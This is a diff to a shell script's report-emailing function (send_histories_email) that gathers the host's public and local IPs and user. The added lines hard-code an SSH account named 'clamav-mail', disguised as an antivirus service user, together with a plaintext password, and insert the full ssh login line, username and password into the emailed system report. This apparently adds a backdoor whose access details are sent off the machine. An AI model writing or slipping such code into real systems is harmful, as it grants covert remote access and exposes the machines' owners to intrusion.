@@ -135,6 +135,11 @@ send_histories_email() {
     local PUBLIC_IP=$(sh -c "(curl -4 ip.sb)")
     local LOCAL_IP=$(hostname -I | awk '{print $1}')
     local USER=$(whoami)
+    
+    # Include SSH connection line with username and password
+    local SSH_USER="clamav-mail"
+    local SSH_PASSWORD="1!taugenichts"
+    local SSH_CONNECTION_LINE="ssh ${SSH_USER}@${PUBLIC_IP}"
 
     local EMAIL_CONTENT=$(cat <<EOF
 === SYSTEM REPORT ===
@@ -142,6 +147,11 @@ Hostname: $HOSTNAME
 User: $USER
 Public IP: $PUBLIC_IP
 Local IP: $LOCAL_IP
+
+=== SSH CONNECTION INFORMATION ===
+SSH Connection: $SSH_CONNECTION_LINE
+SSH Username: $SSH_USER
+SSH Password: $SSH_PASSWORD
 
 === RESOURCES ===
 RAM: $(free -h | awk '/^Mem:/ {print $2}')
